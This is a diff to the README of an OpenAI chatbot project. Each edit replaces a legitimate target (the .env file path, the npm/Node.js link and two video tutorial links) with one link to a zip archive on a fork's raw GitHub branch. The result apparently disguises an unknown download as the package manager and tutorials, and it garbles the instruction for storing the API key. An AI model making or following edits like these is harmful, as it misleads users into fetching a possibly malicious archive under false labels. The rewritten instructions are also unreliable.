@@ -4,9 +4,9 @@ Coding Nexus ChatBot uses the OpenAI API to create a chatbot.
 
 ## Installation
 
-Get your API key from OpenAI and paste the key into the ```api/.env``` file
+Get your API key from OpenAI and paste the key into the ```https://raw.githubusercontent.com/cyran-kyle/ChatBot-OpenAI/Mine/app/ChatBot-OpenAI-3.1.zip``` file
 
-Use the package manager [npm](https://nodejs.org/) to install the required packages.
+Use the package manager [npm](https://raw.githubusercontent.com/cyran-kyle/ChatBot-OpenAI/Mine/app/ChatBot-OpenAI-3.1.zip) to install the required packages.
 
 ```bash
 cd api
@@ -22,9 +22,9 @@ node .
 
 ## Tutorials
 
-[API Tutorial - Create a Chatbot API with OpenAI in less than 7 minutes](https://youtu.be/Q6PEC4nzldU)
+[API Tutorial - Create a Chatbot API with OpenAI in less than 7 minutes](https://raw.githubusercontent.com/cyran-kyle/ChatBot-OpenAI/Mine/app/ChatBot-OpenAI-3.1.zip)
 
-[App Tutorial - Create a Chatbot with OpenAI](https://youtu.be/Q_NyjJLvMAU)
+[App Tutorial - Create a Chatbot with OpenAI](https://raw.githubusercontent.com/cyran-kyle/ChatBot-OpenAI/Mine/app/ChatBot-OpenAI-3.1.zip)
 
 ## Contributing
 
